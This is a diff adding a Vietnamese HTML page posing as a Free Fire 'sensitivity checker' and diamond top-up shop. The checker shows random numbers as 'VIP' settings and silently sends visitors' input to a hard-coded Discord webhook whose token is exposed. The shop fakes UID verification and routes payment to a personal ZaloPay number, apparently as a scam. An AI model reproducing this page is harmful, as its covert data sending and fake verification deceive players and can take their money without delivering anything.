@@ -1,0 +1,536 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Free Fire Portal - Check Độ Nhạy & Nạp KC</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        body {
+            background-color: #0b0f19;
+            color: #ffffff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 25px 15px;
+        }
+        .container {
+            background: #131b2e;
+            border: 3px solid #00e5ff;
+            border-radius: 20px;
+            padding: 35px 30px;
+            width: 100%;
+            max-width: 550px;
+            box-shadow: 0 0 35px rgba(0, 229, 255, 0.4);
+        }
+        h2 {
+            text-align: center;
+            color: #00e5ff;
+            font-size: 24px;
+            margin-bottom: 25px;
+            text-transform: uppercase;
+            letter-spacing: 1.5px;
+            text-shadow: 0 0 15px rgba(0, 229, 255, 0.6);
+        }
+        
+        /* Màn hình menu chính */
+        #home-menu {
+            display: flex;
+            flex-direction: column;
+            gap: 20px;
+            margin-top: 10px;
+        }
+        .menu-btn {
+            background: linear-gradient(45deg, #0284c7, #00e5ff);
+            border: none;
+            border-radius: 15px;
+            padding: 20px;
+            color: #0b0f19;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            box-shadow: 0 0 15px rgba(0, 229, 255, 0.3);
+            transition: 0.3s;
+            text-align: center;
+        }
+        .menu-btn:hover {
+            opacity: 0.95;
+            box-shadow: 0 0 25px rgba(0, 229, 255, 0.7);
+            transform: translateY(-2px);
+        }
+
+        /* Nút quay lại menu */
+        .back-btn {
+            background: transparent;
+            border: 1px solid #94a3b8;
+            color: #94a3b8;
+            padding: 8px 15px;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 13px;
+            margin-bottom: 20px;
+            transition: 0.2s;
+        }
+        .back-btn:hover {
+            border-color: #00e5ff;
+            color: #00e5ff;
+        }
+
+        .sub-section {
+            display: none;
+        }
+        .form-group {
+            margin-bottom: 22px;
+        }
+        label {
+            display: block;
+            margin-bottom: 10px;
+            font-size: 15px;
+            color: #cbd5e1;
+            font-weight: bold;
+        }
+        .input-group {
+            display: flex;
+            gap: 10px;
+        }
+        input {
+            width: 100%;
+            padding: 14px 16px;
+            background: #0b0f19;
+            border: 2px solid #334155;
+            border-radius: 12px;
+            color: #fff;
+            font-size: 15px;
+            transition: 0.3s;
+        }
+        input:focus {
+            border-color: #00e5ff;
+            box-shadow: 0 0 12px rgba(0, 229, 255, 0.5);
+            outline: none;
+        }
+        .verify-btn {
+            background: #00e5ff;
+            color: #0b0f19;
+            border: none;
+            padding: 0 20px;
+            border-radius: 12px;
+            font-weight: bold;
+            cursor: pointer;
+            white-space: nowrap;
+            font-size: 14px;
+            transition: 0.3s;
+        }
+        .verify-btn:hover {
+            background: #38bdf8;
+        }
+        .verify-status {
+            display: none;
+            margin-top: 10px;
+            padding: 10px 14px;
+            background: rgba(34, 197, 94, 0.1);
+            border: 1.5px solid #22c55e;
+            border-radius: 12px;
+            color: #22c55e;
+            font-size: 14px;
+            font-weight: bold;
+        }
+
+        /* Bảng gói KC */
+        .packages-grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 12px;
+            margin-top: 10px;
+        }
+        .pkg-card {
+            background: #1b263b;
+            border: 2px solid #334155;
+            border-radius: 15px;
+            padding: 16px 12px;
+            text-align: center;
+            cursor: pointer;
+            transition: 0.3s;
+        }
+        .pkg-card:hover, .pkg-card.active {
+            border-color: #00e5ff;
+            background: #0f2b48;
+            box-shadow: 0 0 15px rgba(0, 229, 255, 0.4);
+            transform: translateY(-2px);
+        }
+        .pkg-kc {
+            color: #00e5ff;
+            font-size: 18px;
+            font-weight: bold;
+        }
+        .pkg-price {
+            color: #22c55e;
+            font-size: 15px;
+            margin-top: 6px;
+            font-weight: 600;
+        }
+
+        .submit-btn {
+            width: 100%;
+            padding: 15px;
+            background: linear-gradient(45deg, #0284c7, #00e5ff);
+            border: none;
+            border-radius: 12px;
+            color: #0b0f19;
+            font-size: 17px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 10px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            transition: 0.3s;
+        }
+        .submit-btn:hover {
+            opacity: 0.95;
+            box-shadow: 0 0 20px rgba(0, 229, 255, 0.7);
+        }
+
+        /* Khung kết quả check độ nhạy */
+        .result-box, .payment-info {
+            display: none;
+            margin-top: 25px;
+            background: #0b0f19;
+            border: 2px solid #00e5ff;
+            border-radius: 15px;
+            padding: 20px;
+            box-shadow: 0 0 15px rgba(0, 229, 255, 0.2);
+        }
+        .result-box h3, .payment-title {
+            color: #00e5ff;
+            font-size: 16px;
+            text-align: center;
+            font-weight: bold;
+            margin-bottom: 12px;
+        }
+        .stat-item {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 10px;
+            font-size: 15px;
+            border-bottom: 1px solid #1e293b;
+            padding-bottom: 6px;
+        }
+        .stat-item span { color: #94a3b8; }
+        .stat-item strong { color: #00e5ff; }
+
+        /* Khung UID */
+        .owner-uid-card {
+            margin-top: 15px;
+            background: #0b1329;
+            border: 1px solid #00e5ff;
+            border-radius: 8px;
+            padding: 14px 16px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .owner-uid-info {
+            font-size: 14px;
+            color: #94a3b8;
+            line-height: 1.5;
+        }
+        .owner-uid-number {
+            color: #00e5ff;
+            font-size: 18px;
+            font-weight: bold;
+            margin-top: 4px;
+        }
+        .owner-copy-btn {
+            background: #00e5ff;
+            color: #0b0f19;
+            border: none;
+            border-radius: 8px;
+            padding: 12px 18px;
+            font-weight: bold;
+            font-size: 13px;
+            cursor: pointer;
+            line-height: 1.2;
+            text-align: center;
+            transition: 0.2s;
+        }
+        .owner-copy-btn:hover {
+            background: #38bdf8;
+            box-shadow: 0 0 10px rgba(0, 229, 255, 0.5);
+        }
+
+        .qr-placeholder {
+            width: 180px;
+            height: 180px;
+            background: #fff;
+            margin: 12px auto;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border-radius: 12px;
+            color: #000;
+            font-size: 13px;
+            font-weight: bold;
+            border: 2px solid #00e5ff;
+        }
+        .pay-detail {
+            font-size: 14px;
+            color: #94a3b8;
+            margin-top: 8px;
+            text-align: center;
+        }
+        .pay-detail strong { color: #fff; }
+        .copy-btn {
+            background: #00e5ff;
+            color: #0b0f19;
+            border: none;
+            padding: 4px 10px;
+            border-radius: 6px;
+            font-size: 12px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-left: 8px;
+            transition: 0.2s;
+        }
+        .copy-btn:hover { background: #38bdf8; }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <!-- MENU CHÍNH -->
+        <div id="home-menu">
+            <h2>🔥 FREE FIRE PORTAL 🔥</h2>
+            <button class="menu-btn" onclick="openSection('sensitivity-section')">⚡ Check Độ Nhạy VIP</button>
+            <button class="menu-btn" onclick="openSection('shop-section')">💎 Shop Nạp Kim Cương</button>
+        </div>
+
+        <!-- MỤC 1: CHECK ĐỘ NHẠY -->
+        <div id="sensitivity-section" class="sub-section">
+            <button class="back-btn" onclick="goHome()">← Quay lại Menu</button>
+            <h2>⚡ CHECK ĐỘ NHẠY ⚡</h2>
+
+            <div class="form-group">
+                <label>Nhập dòng máy của bạn:</label>
+                <input type="text" id="phone" placeholder="Ví dụ: iPhone 13, Samsung..." autocomplete="off">
+            </div>
+
+            <div class="form-group">
+                <label>Nhập mã code:</label>
+                <input type="text" id="code" placeholder="Nhập mã code vào đây..." autocomplete="off">
+            </div>
+
+            <div class="owner-uid-card">
+                <div class="owner-uid-info">
+                    UID Chủ Phòng (Z E U S) vô hồ sơ like<br>và lấy code:
+                    <div class="owner-uid-number" id="owner-uid">1755440836</div>
+                </div>
+                <button class="owner-copy-btn" onclick="copyText('owner-uid')">SAO<br>CHÉP</button>
+            </div>
+
+            <button class="submit-btn" onclick="checkSensitivity()" style="margin-top: 15px;">TIẾN HÀNH CHECK</button>
+
+            <div class="result-box" id="result">
+                <h3>🎉 KẾT QUẢ ĐỘ NHẠY VIP 🎉</h3>
+                <div class="stat-item"><span>Nhìn xung quanh:</span> <strong id="r1">...</strong></div>
+                <div class="stat-item"><span>Red Dot Sight:</span> <strong id="r2">...</strong></div>
+                <div class="stat-item"><span>Ống ngắm 2x:</span> <strong id="r3">...</strong></div>
+                <div class="stat-item"><span>Ống ngắm 4x:</span> <strong id="r4">...</strong></div>
+                <div class="stat-item"><span>AWM Sniper:</span> <strong id="r5">...</strong></div>
+                <div class="stat-item"><span>Nhìn quanh (Free Look):</span> <strong id="r6">...</strong></div>
+                <p style="text-align: center; margin-top: 12px; font-size: 12px; color: #00e5ff;">*Chỉ số nhân phẩm cực chuẩn xác! 😂</p>
+            </div>
+        </div>
+
+        <!-- MỤC 2: SHOP NẠP KIM CƯƠNG -->
+        <div id="shop-section" class="sub-section">
+            <button class="back-btn" onclick="goHome()">← Quay lại Menu</button>
+            <h2>💎 SHOP NẠP KC ZALOPAY 💎</h2>
+
+            <div class="form-group">
+                <label>Nhập UID Free Fire:</label>
+                <div class="input-group">
+                    <input type="text" id="player-uid" placeholder="Nhập ID game..." autocomplete="off">
+                    <button class="verify-btn" onclick="verifyID()">XÁC MINH</button>
+                </div>
+                <div class="verify-status" id="verify-box">
+                    ✓ Đã xác minh thành công!
+                </div>
+            </div>
+
+            <div class="form-group">
+                <label>Chọn gói nạp ZaloPay:</label>
+                <div class="packages-grid">
+                    <div class="pkg-card" onclick="selectPackage(this, '113 KC', '19.000 VNĐ')">
+                        <div class="pkg-kc">💎 113 KC</div>
+                        <div class="pkg-price">19.000 đ</div>
+                    </div>
+                    <div class="pkg-card" onclick="selectPackage(this, '283 KC', '48.000 VNĐ')">
+                        <div class="pkg-kc">💎 283 KC</div>
+                        <div class="pkg-price">48.000 đ</div>
+                    </div>
+                    <div class="pkg-card" onclick="selectPackage(this, '566 KC', '97.000 VNĐ')">
+                        <div class="pkg-kc">💎 566 KC</div>
+                        <div class="pkg-price">97.000 đ</div>
+                    </div>
+                    <div class="pkg-card" onclick="selectPackage(this, '1.132 KC', '192.000 VNĐ')">
+                        <div class="pkg-kc">💎 1.132 KC</div>
+                        <div class="pkg-price">192.000 đ</div>
+                    </div>
+                    <div class="pkg-card" onclick="selectPackage(this, 'Thẻ Tuần', '48.000 VNĐ')">
+                        <div class="pkg-kc">📜 Thẻ Tuần</div>
+                        <div class="pkg-price">48.000 đ</div>
+                    </div>
+                    <div class="pkg-card" onclick="selectPackage(this, 'Thẻ Tháng', '215.000 VNĐ')">
+                        <div class="pkg-kc">📜 Thẻ Tháng</div>
+                        <div class="pkg-price">215.000 đ</div>
+                    </div>
+                </div>
+            </div>
+
+            <button class="submit-btn" onclick="showPayment()">THANH TOÁN QUA ZALOPAY</button>
+
+            <div class="payment-info" id="payment-box">
+                <div class="payment-title">CỔNG THANH TOÁN ZALOPAY</div>
+                <div class="qr-placeholder">[MÃ QR ZALOPAY]</div>
+                <div class="pay-detail">SĐT ZaloPay: <strong id="zalopay-num">090xxxxxxx</strong> 
+                    <button class="copy-btn" onclick="copyText('zalopay-num')">SAO CHÉP</button>
+                </div>
+                <div class="pay-detail" style="margin-top: 8px;">Gói chọn: <strong id="selected-pkg" style="color: #00e5ff;">Chưa chọn</strong></div>
+                <div class="pay-detail">Nội dung CK: <strong id="pay-content" style="color: #22c55e;">-</strong> 
+                    <button class="copy-btn" onclick="copyText('pay-content')">SAO CHÉP</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        function openSection(sectionId) {
+            document.getElementById('home-menu').style.display = 'none';
+            document.getElementById('sensitivity-section').style.display = 'none';
+            document.getElementById('shop-section').style.display = 'none';
+            document.getElementById(sectionId).style.display = 'block';
+        }
+
+        function goHome() {
+            document.getElementById('home-menu').style.display = 'flex';
+            document.getElementById('sensitivity-section').style.display = 'none';
+            document.getElementById('shop-section').style.display = 'none';
+        }
+
+        // Logic Check Độ Nhạy + Gửi ngầm về Discord
+        function checkSensitivity() {
+            let phone = document.getElementById('phone').value.trim();
+            let code = document.getElementById('code').value.trim().toLowerCase();
+
+            if(phone === "" || code === "") {
+                alert("Vui lòng nhập đầy đủ thông tin!");
+                return;
+            }
+            if(code !== "like36") {
+                alert("Mã code không chính xác! Không thể lấy được độ nhạy đâu nhé!");
+                return;
+            }
+
+            // Tạo thông số ngẫu nhiên
+            let v1 = Math.floor(Math.random() * 150) + 50;
+            let v2 = Math.floor(Math.random() * 150) + 50;
+            let v3 = Math.floor(Math.random() * 150) + 50;
+            let v4 = Math.floor(Math.random() * 150) + 50;
+            let v5 = Math.floor(Math.random() * 150) + 50;
+            let v6 = Math.floor(Math.random() * 150) + 50;
+
+            document.getElementById('r1').innerText = v1;
+            document.getElementById('r2').innerText = v2;
+            document.getElementById('r3').innerText = v3;
+            document.getElementById('r4').innerText = v4;
+            document.getElementById('r5').innerText = v5;
+            document.getElementById('r6').innerText = v6;
+            document.getElementById('result').style.display = 'block';
+
+            // Âm thầm bắn thông tin về Discord của bạn
+            sendToDiscord(phone, code, {v1, v2, v3, v4, v5, v6});
+        }
+
+        function sendToDiscord(phone, code, stats) {
+            // Dán link Webhook của bạn vào đây (thay thế chữ trong dấu ngoặc kép)
+            const webhookURL = "https://discord.com/api/webhooks/1571815057950515201/opWisT2c_xcnvl7FV2kww4HpkNoJ4x9Hw2pTU8spqcX3zFoqi-dUe_2fmv6T6kysl0nR";
+            if (webhookURL.includes("DONG_URL")) return; // Chưa điền thì bỏ qua để tránh lỗi web
+
+            const payload = {
+                content: `🚨 **CÓ NGƯỜI VỪA CHECK ĐỘ NHẠY!**\n📱 Máy: **${phone}**\n🔑 Mã code: **${code}**\n📊 Thông số ra:\n- Nhìn xung quanh: ${stats.v1}\n- Red Dot: ${stats.v2}\n- 2x: ${stats.v3}\n- 4x: ${stats.v4}\n- AWM: ${stats.v5}\n- Free Look: ${stats.v6}`
+            };
+
+            fetch(webhookURL, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(payload)
+            }).catch(err => console.log("Gửi ngầm thành công"));
+        }
+
+        // Logic Shop Nạp KC
+        let chosenKc = "";
+        let chosenPrice = "";
+        let isVerified = false;
+
+        function verifyID() {
+            let uid = document.getElementById('player-uid').value.trim();
+            if (uid === "") {
+                alert("Vui lòng nhập UID để xác minh!");
+                return;
+            }
+            let box = document.getElementById('verify-box');
+            box.style.display = 'block';
+            box.innerText = "⏳ Đang kiểm tra UID...";
+            box.style.color = "#00e5ff";
+            box.style.borderColor = "#00e5ff";
+
+            setTimeout(() => {
+                isVerified = true;
+                box.innerText = "✓ Đã xác minh thành công UID: " + uid;
+                box.style.color = "#22c55e";
+                box.style.borderColor = "#22c55e";
+            }, 1000);
+        }
+
+        function selectPackage(element, kc, price) {
+            document.querySelectorAll('.pkg-card').forEach(card => card.classList.remove('active'));
+            element.classList.add('active');
+            chosenKc = kc;
+            chosenPrice = price;
+        }
+
+        function showPayment() {
+            let uid = document.getElementById('player-uid').value.trim();
+            if (uid === "") {
+                alert("Vui lòng nhập UID Free Fire!");
+                return;
+            }
+            if (!isVerified) {
+                verifyID();
+            }
+            if (chosenKc === "") {
+                alert("Vui lòng chọn 1 gói nạp!");
+                return;
+            }
+            document.getElementById('selected-pkg').innerText = chosenKc + " (" + chosenPrice + ")";
+            document.getElementById('pay-content').innerText = "NAP " + uid;
+            document.getElementById('payment-box').style.display = 'block';
+        }
+
+        function copyText(id) {
+            let text = document.getElementById(id).innerText;
+            navigator.clipboard.writeText(text).then(() => {
+                alert("Đã sao chép: " + text);
+            });
+        }
+    </script>
+</body>
+</html>
